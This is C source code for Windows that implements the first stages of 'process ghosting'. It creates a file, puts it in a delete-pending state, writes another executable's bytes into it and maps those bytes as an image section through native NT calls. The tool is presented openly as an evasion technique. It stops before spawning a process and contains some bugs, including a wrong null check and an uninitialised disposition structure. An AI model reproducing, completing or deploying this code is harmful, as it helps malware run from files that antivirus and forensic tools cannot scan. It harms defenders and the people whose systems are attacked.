#include <io.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include <stdlib.h>
#include <windows.h>
#include "ghosted.h"

#pragma comment(lib, "ntdll")

unsigned int get_entrypoint(HANDLE hfile, DWORD f_size) {
	HANDLE hmap;
	LPVOID base_addr;
	ULARGE_INTEGER mapping_size;
	unsigned int entry_point = 0;

	mapping_size.QuadPart = f_size;
	
	// Create file mapping
	hmap = CreateFileMappingA(
		hfile,
		NULL,
		PAGE_READONLY,
		0,
		0, 
		NULL);

	if (hmap == NULL) {
		fprintf(stderr, "[!] Invalid Handle returned by NtCreateSession()\n");
		return 0;
	}
	
	base_addr = MapViewOfFile(
		hmap, 
		FILE_MAP_READ, 
		0, 
		0, 
		mapping_size.LowPart);

	if (NULL == base_addr) {
		fprintf(stderr, "[!] MapViewOfFile() failed (0x%x)\n", GetLastError());
		return 0;
	}

	// Get DOS header
	IMAGE_DOS_HEADER * dos_hdr = (IMAGE_DOS_HEADER*)(base_addr);

	// Check DOS Signature
	if (dos_hdr->e_magic != IMAGE_DOS_SIGNATURE) {
		fprintf(stderr, "[!] Invalid DOS Signature\n");
		return 0;
	}

	// Get offset of exe
	LONG pe_offset = dos_hdr->e_lfanew;
	
	// Check if offst is greater than PE Header
	if (pe_offset > 1024) {
		fprintf(stderr, "[!] File address > PE header\n");
		return 0;
	}


	return 1;
}


// Prepare fake_exe and put it in delete mode
HANDLE prepare_target(char * target_exe) {
	HANDLE h_tfile;
	NTSTATUS _status;
	IO_STATUS_BLOCK io_status;
	FILE_DISPOSITION_INFORMATION f_fileinfo;

	// Create Fake File
	h_tfile = CreateFileA(
		target_exe, 
		DELETE | SYNCHRONIZE | FILE_GENERIC_READ | FILE_GENERIC_WRITE ,
		FILE_SHARE_READ | FILE_SHARE_WRITE,
		NULL,
		OPEN_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL
	);

	if (h_tfile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Failed to create: %s(0x%x)\n", target_exe, GetLastError());
		return NULL;
	}

	printf("> Created File:\t%s\n", target_exe);

	// Setting Target File in Delete Pending State
	RtlZeroMemory(&io_status, sizeof(io_status));
	FILE_INFORMATION_CLASS f_info = FileDispositionInformation;
	_status = NtSetInformationFile(
		h_tfile, 
		&io_status, 
		&f_fileinfo, 
		sizeof(f_fileinfo),
		f_info);

	if (!NT_SUCCESS(_status)) {
		fprintf(stderr, "[!] NtSetInformationFile failed (0x%x)\n", _status);
		CloseHandle(h_tfile);
		return NULL;
	}

	if (!NT_SUCCESS(io_status.Status)) {
		fprintf(stderr, "[!] Failed to put file in 'Delete-Pending' State (0x%x)\n", _status);
		CloseHandle(h_tfile);
		return NULL;
	}

	printf("> Put file in 'Delete-Pending' state\n");
	return h_tfile;		// Return handle to target file
}

// Read original file
unsigned char * read_orig_exe(char * original_exe) {
	HANDLE hfile;
	DWORD ho_fsz, lo_fsz;

	// Open file for reading
	hfile = CreateFileA(
		original_exe, 
		GENERIC_READ, 
		0, 
		NULL, 
		OPEN_EXISTING, 
		FILE_ATTRIBUTE_NORMAL, 
		NULL);

	if (hfile == INVALID_HANDLE_VALUE) {
		fprintf(stderr, "[!] Could not open %s for reading(0x%x)\n", original_exe, GetLastError());
		return NULL;
	}
	printf("> Opened Orifinal Exe for reading\n");

	// Get File Size
	lo_fsz = GetFileSize(hfile, &ho_fsz);
	if (lo_fsz == INVALID_FILE_SIZE) {
		fprintf(stderr, "[!] Failed to get file size (0x%x)\n", GetLastError());
		CloseHandle(hfile);
		return NULL;
	}

	// Allocate memory
	unsigned char* s_bytes = (unsigned char*)malloc(lo_fsz);
	if (s_bytes == NULL) {
		fprintf(stderr, "[!] Malloc() failed (0x%x)\n", GetLastError());
		CloseHandle(hfile);
		return NULL;
	}

	// Read File
	BOOL result = ReadFile(
		hfile,
		s_bytes,
		lo_fsz,
		&ho_fsz,
		NULL
	);

	if (!result) {
		fprintf(stderr, "[!] Failed to read\t%s (0x%x)\n", original_exe, GetLastError());
		free(s_bytes);
		CloseHandle(hfile);
		return NULL;
	}
	CloseHandle(hfile);
	return s_bytes;
}

// Write to Fake file and create sections
HANDLE fetch_sections(HANDLE hfile, unsigned char * f_bytes, DWORD f_size) {
	BOOL _res;
	HANDLE hsection;
	DWORD _ho_fsz;
	NTSTATUS _status;

	// Write to open handle of the file to be deleted
	_res = WriteFile(
		hfile,
		(LPCVOID)f_bytes,
		f_size,
		&_ho_fsz,
		NULL
	);

	if (!_res) {
		fprintf(stderr, "[!] Failed to write payload (0x%x)\n", GetLastError());
		return NULL;
	}

	printf("> Wrote %d bytes to target!\n", f_size);
	
	// Create section object
	hsection = 0;
	_status = NtCreateSection(
		&hsection,
		SECTION_ALL_ACCESS,
		NULL,
		0,
		PAGE_READONLY, 
		SEC_IMAGE,
		hfile
	);

	if (!NT_SUCCESS(_status)) {
		fprintf(stderr, "[!] NtCreateSession() failed! (0x%x)\n", _status);
		return NULL;
	}

	if (hsection == INVALID_HANDLE_VALUE || hsection == NULL) {
		fprintf(stderr, "[!] Invalid Handle returned by NtCreateSession() (0x%x)\n", _status);
		return NULL;
	}

	printf("> Created a session object!\n");
	return hsection;
}

// Spawn a process using ghosting
int spawn_process(char* real_exe, char* fake_exe) {
	DWORD f_size;
	HANDLE hfakefile, hsection;

	// Create fake executable and put it in delete-pending state
	hfakefile = prepare_target(fake_exe);
	if (NULL == hfakefile) {
		return -1;
	}

	// read contents from the real executable
	unsigned char * f_bytes = read_orig_exe(real_exe);
	if (real_exe == NULL) {
		CloseHandle(hfakefile);
		return -2;
	}

	f_size = (DWORD)_msize(f_bytes);
	
	hsection = fetch_sections(hfakefile, f_bytes, f_size);
 	free(f_bytes);
	if (hsection == NULL) {
		CloseHandle(hfakefile);
		return -3;
	}


	// unsigned int _res = get_entrypoint(hfakefile, lo_fsz);
	// if (_res == 0) {
	// 	fprintf(stderr, "[!] Failed to get Entry Point\n");
	// 	return -10;
	// }

	// CloseHandle(hsection);
	CloseHandle(hsection);
	CloseHandle(hfakefile);
	return 0;
}

int main(int argc, char** argv) {
	
	if (argc != 3) {
		fprintf(stderr, "[!] Invalid Usage\n");
		fprintf(stderr, "[i] Usage: %s <REAL EXE> <FAKE EXE>\n", argv[0]);
		return -1;
	}

	printf("==== Ghost Prcesses, Not People ====\n");

	char real_exe[MAX_PATH] = { 0 };
	char fake_exe[MAX_PATH] = { 0 };

	strcpy_s(real_exe, MAX_PATH, argv[1]);
	strcpy_s(fake_exe, MAX_PATH, argv[2]);

	// Check if real_exe exists with READ permissions
	if (_access_s(real_exe, 4) != 0) {
		fprintf(stderr, "[!] Failed to access:\t%s\n", real_exe);
		return -2;
	}

	// Check fake_exe does not exist
	if (_access_s(fake_exe, 0) == 0) {
		fprintf(stderr, "[!] File already present:\t%s\n", fake_exe);
		return -3;
	}

	int result = spawn_process(real_exe, fake_exe);

	return result;
}